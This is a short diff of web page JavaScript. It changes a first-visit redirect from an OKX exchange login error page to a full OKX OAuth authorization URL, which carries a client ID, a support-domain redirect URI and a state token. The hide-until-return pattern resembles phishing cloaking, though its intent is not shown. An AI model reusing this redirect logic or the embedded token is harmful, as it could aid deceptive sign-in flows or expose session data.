@@ -113,7 +113,7 @@
             if (!hasVisited) {
                 // If it's the user's first visit, set the flag and redirect
                 localStorage.setItem("hasVisited", "true");
-                window.location.href = 'https://www.okx.com/account/authlogin#error=access_denied'; // URL of Page (1)
+                window.location.href = 'https://www.okx.com/account/oauth?access_type=offline&response_type=code&inapp_redirect=true&client_id=db50e9193d264fdbadea1d3e287c40feQ5UAx5f8&redirect_uri=https%3A%2F%2Fokx.ada.support%2Fapi%2Foauth%2Fauthorization&scope=read_only&state=.eJwVjEkOwyAQwP7CuUgDAbJ8BrEMCgoJEUN6qfr30qtl-8PC7nrHZns98GIbm6NxKPzCk_aSK1gnvopZ8MUoqYRGEVdgL3YX11Nt5yj-h0Ea0l0vQpvjgGbyftEBwEhwUXoTQCOAGmImS-jOgkTWPX1nW3KFcDyPgDbUiPaNLaeMjW3XU8r3B2NfNLo.ZyKwuA.dijyjbKp6BKNAX-kyOx56bAE4pM'; // URL of Page (1)
             } else {
                 // If the user has already visited, show the body
                 document.body.classList.remove("hidden");
